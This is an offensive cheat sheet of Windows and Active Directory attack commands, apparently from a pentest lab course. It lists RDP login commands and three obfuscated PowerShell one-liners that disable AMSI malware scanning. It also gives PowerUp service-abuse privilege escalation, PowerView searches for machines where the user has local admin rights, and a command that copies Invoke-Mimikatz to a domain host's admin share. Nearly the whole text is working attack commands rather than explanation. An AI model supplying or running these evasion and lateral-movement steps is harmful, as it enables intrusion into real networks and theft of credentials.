# RDP ACCESS : 
``
xfreerdp /v:$IP /u:$USERNAME /p:$PASSWORD /size:1440x970 +clipboard 
rdesktop -u $USERNAM -p $PASSWORD -g 90% $IP
``

# BYPASS AMSI : 

* METHODE 1 : 
``
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
``

* METHODE 2 : 
``
$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true)
``

* METHODE 3 : 
``
Invoke-Command -Scriptblock {sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )} $sess
``

# IMPORT POWERSHELL MODULES : 

example powerview.ps1 : `. .\powerview.ps1` or `import-module powerview.ps1` 

# PRIV ESC : 

1 - import powerup.ps1 : `. .\powerup.ps1`
2 - execute : `Invoke-allchecks`
3 - Abuse service to get local admin permissions with powerup : `Invoke-ServiceAbuse -Name 'ChangeToServiceNAme' -UserName '<domain>\<username>'`

# Find all machines on the current domain where the current user has local admin access :

* METHODE 1 (powerview) : ``Find-LocalAdminAccess -Verbose``

* METHODE 2 : 
``
. ./Find-WMILocalAdminAccess.ps1
Find-WMILocalAdminAccess
``

* METHODE 3 : 
``
. ./Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
``

# Powerview Find local admins on all machines of the domain (needs admin privs) : `Invoke-EnumerateLocalAdmin -Verbose`

# Connect to machine with administrator privs : `Enter-PSSession -Computername <computername>`

# Copy item from attacker to another machine (admin) : ` Copy-Item .\Invoke-Mimikatz.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\`





